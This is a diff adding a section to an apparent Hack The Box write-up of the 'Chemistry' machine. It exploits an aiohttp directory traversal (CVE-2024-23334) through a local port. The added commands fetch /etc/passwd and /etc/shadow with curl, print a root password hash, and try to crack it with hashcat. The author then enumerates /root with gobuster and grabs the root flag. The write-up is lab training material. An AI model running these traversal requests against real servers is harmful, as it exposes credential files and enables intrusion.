@@ -1,7 +1,7 @@
 ---
 layout: post
 title: 'Hack The Box - Machine Write-Up: Chemistry'
-created-at: 2025-02-02
+created-at: 2025-02-04
 categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
 ---
 
@@ -386,5 +386,211 @@ I can now navigate to `localhost:8080` and see the landing page:
 
 The only option that seems to work there is the "List Services", but it doesn't seem to have nothing different from what I could find connecting directly to the machine through SSH.
 
+Using `Burp Suite` I can see that the response is coming from a `Python/3.9 aiohttp/3.9.1` server.
 
+Quick Google for "aiohttp vulnerability" and I can see that it is [susceptible for directory traversal attacks](https://pentest-tools.com/vulnerabilities-exploits/aiohttp-directory-traversal_22528) (`CVE-2024-23334`).
 
+I used the [PoC](https://github.com/z3rObyte/CVE-2024-23334-PoC/tree/main) to map out the possibilities:
+
+```
+> ./poc.sh 
+[+] Testing with /static/../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../../../../../etc/passwd
+        Status code --> 404
+[+] Testing with /static/../../../../../../../../../../../../../../../etc/passwd
+        Status code --> 404
+```
+
+but no luck.
+
+Running the website through `gobuster` showed that the `/static` path actually doesn't exist. But the `/assets` does.
+
+```
+gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://localhost:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 403) [Size: 14]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+Found path traversal under `/assets/../../../`: 
+
+```
+> ./poc.sh                                                                     
+[+] Testing with /assets/../etc/passwd
+        Status code --> 404
+[+] Testing with /assets/../../etc/passwd
+        Status code --> 404
+[+] Testing with /assets/../../../etc/passwd
+        Status code --> 200
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+Getting the `/etc/shadow` file:
+
+```
+> curl -s --path-as-is "http://localhost:8080/assets/../../../etc/shadow"
+root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
+daemon:*:19430:0:99999:7:::
+bin:*:19430:0:99999:7:::
+...
+```
+
+Quick look under the [shadow file documentation](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) it seems that this password is stored as SHA-512.
+
+I tried running the password through `hashcat` in case it was known easy password, but no luck:
+
+```
+> hashcat root.pws.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+
+...
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
+
+...
+
+Session..........: hashcat                                
+Status...........: Exhausted
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW6...BkRpl.
+Time.Started.....: Tue Feb  4 01:31:04 2025 (1 hour, 6 mins)
+Time.Estimated...: Tue Feb  4 02:37:55 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     3579 H/s (0.97ms) @ Accel:512 Loops:64 Thr:1 Vec:2
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 0/14344385 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Util: 50%
+```
+
+If the root password is not present on the `rockyou.txt` word list, I imagine that the password is not supposed to be cracked on this context.
+
+I then had a interesting idea. Since the path traversal happen over HTTP, I can use `gobuster` to comb through the directories:
+
+```
+> gobuster dir -u http://localhost:8080/assets/../../../ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://localhost:8080/assets/../../../
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/bin                  (Status: 403) [Size: 14]
+/boot                 (Status: 403) [Size: 14]
+/dev                  (Status: 403) [Size: 14]
+/etc                  (Status: 403) [Size: 14]
+/home                 (Status: 403) [Size: 14]
+/lib                  (Status: 403) [Size: 14]
+/lost+found           (Status: 403) [Size: 14]
+/media                (Status: 403) [Size: 14]
+/opt                  (Status: 403) [Size: 14]
+/proc                 (Status: 403) [Size: 14]
+/root                 (Status: 403) [Size: 14]   <-- had forgotten about this
+/run                  (Status: 403) [Size: 14]
+/sbin                 (Status: 403) [Size: 14]
+/srv                  (Status: 403) [Size: 14]
+/sys                  (Status: 403) [Size: 14]
+/tmp                  (Status: 403) [Size: 14]
+/usr                  (Status: 403) [Size: 14]
+/var                  (Status: 403) [Size: 14]
+Progress: 9228 / 9230 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+Then looking through `/root`:
+
+```
+> gobuster dir -u http://localhost:8080/assets/../../../root/ -x txt -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://localhost:8080/assets/../../../root/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.cache               (Status: 403) [Size: 14]
+/.bashrc              (Status: 200) [Size: 3106]
+/.ssh                 (Status: 403) [Size: 14]
+/.profile             (Status: 200) [Size: 161]
+/root.txt             (Status: 200) [Size: 33]
+Progress: 9228 / 9230 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+Nice, I can now just retrieve the root flag using:
+
+> curl -s --path-as-is "http://localhost:8080/assets/../../../root/root.txt" 
